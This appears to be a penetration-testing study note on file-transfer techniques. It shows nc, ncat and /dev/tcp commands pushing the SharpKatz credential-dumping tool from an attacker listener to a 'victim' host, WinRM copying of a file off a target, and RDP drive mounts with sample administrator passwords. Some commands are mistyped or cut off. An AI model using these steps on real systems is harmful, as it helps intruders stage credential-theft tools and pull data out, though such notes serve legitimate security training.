---
title: "file transfer using nc_ncat and rdp_winrm"
weight: 28
---
nc

```shell-session
cube111@local[/local]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

```shell-session
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```

&nbsp;

&nbsp;
ncat

```shell-session
cube111@local[/local]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

```shell-session
victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

&nbsp;

[/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html).

&nbsp;

```shell-session
cube111@local[/local]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

&nbsp;

```shell-session
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

&nbsp;

&#****WINDOWS****

File transfer via WINRM port 5984  
check of winrm is running

```powershell-session
PS C:\local> Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

&nbsp;

#### Create a PowerShell Remoting Session to DATABASE01

Miscellaenous File Transfer Methods

```powershell-session
PS C:\local> $Session = New-PSSession -ComputerName DATABASE01
```

&nbsp;

#### Copy samplefile.txt from our Localhost to the DATABASE01 Session

Miscellaenous File Transfer Methods

```powershell-session
PS C:\local> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

&nbsp;

&nbsp;

&nbsp;

#### opy DATABASE.txt from DATABASE01 Session to our Localhost

Miscellaenous File Transfer Methods

```powershell-session
PS C:\local> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Sessio
```

&nbsp;

## RDP

&nbsp;

#### Mounting a Linux Folder Using rdesktop

Miscellaenous File Transfer Methods

```shell-session
cube111@local[/local]$ rdesktop 10.10.10.132 -d local -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

&nbsp;

#### Mounting a Linux Folder Using xfreerdp

Miscellaenous File Transfer Methods

```shell-session
cube111@local[/local]$ xfreerdp /v:10.10.10.132 /d:local /u:administrator /p:'Password0@' /dynamic-resolution /drive:linux,/home/plaintext/local/academy/filetransfer
```

&nbsp;

&nbsp;

![cb7bc7f460ec56681cdbbf5a0b2d719b.png](/resources/cb7bc7f460ec56681cdbbf5a0b2d719b.png)

&nbsp;

Alternatively, from Windows, the native [mstsc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc) remote desktop client can be used.
```